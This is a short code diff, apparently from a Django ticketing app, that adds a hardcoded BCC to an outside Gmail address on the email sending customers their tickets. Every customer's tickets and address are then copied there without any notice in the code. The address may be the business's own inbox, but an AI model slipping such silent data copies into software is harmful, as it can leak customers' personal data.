@@ -21,7 +21,8 @@ def send_tickets_email(email, tickets, site_base=None):
     msg = EmailMultiAlternatives(
         subject, 
         "Your tickets are attached.", 
-        to=[email]
+        to=[email],
+        bcc=["tjaofficialbooking@gmail.com"],
     )
     msg.attach_alternative(html, "text/html")
 
